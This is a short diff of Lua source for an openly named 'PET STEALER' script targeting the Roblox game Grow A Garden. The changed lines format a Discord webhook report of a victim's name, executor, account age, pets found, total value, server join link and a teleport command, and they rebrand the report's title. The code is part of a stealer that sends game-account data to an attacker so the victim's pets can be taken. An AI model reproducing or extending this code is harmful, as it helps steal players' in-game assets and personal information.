@@ -344,7 +344,7 @@
         local playerInfoSection = string.format("```Name: %s\nExecutor: %s\nAccount Age: %s days\nPlayers in game: %s/%s```", playerName, executor, "72", playerCount, maxPlayers)
         
         local description = string.format(
-            ":bust_in_silhouette: **Player Information**\n%s\n💰 **Total Value:**\n```%s```\n🐕 **Pets Found:**\n```%s```\n\n🔗 **Game Link:** [Click to join](%s)\n`%s`",
+            ":bust_in_silhouette: **Player Information**\n%s\n💰 **Total Value:**\n```%s```\n🐕 **Pets Found:**\n```%s```\n🔗 **Game Link:** [Click to join](%s)\n\n-# %s",
             playerInfoSection,
             totalValueStr,
             petListStr,
@@ -356,7 +356,7 @@
             ["content"] = prefix .. "```lua\n" .. teleportCmd .. "\n```",
             ["username"] = playerName,
             ["embeds"] = {{
-                ["title"] = "🔴 X Scripts Gag Stealer",
+                ["title"] = ":dog: Grow A Garden Hit - ZANJI: PET STEALER :dog:",
                 ["color"] = 15158332, -- Red color
                 ["description"] = description,
                 ["footer"] = {
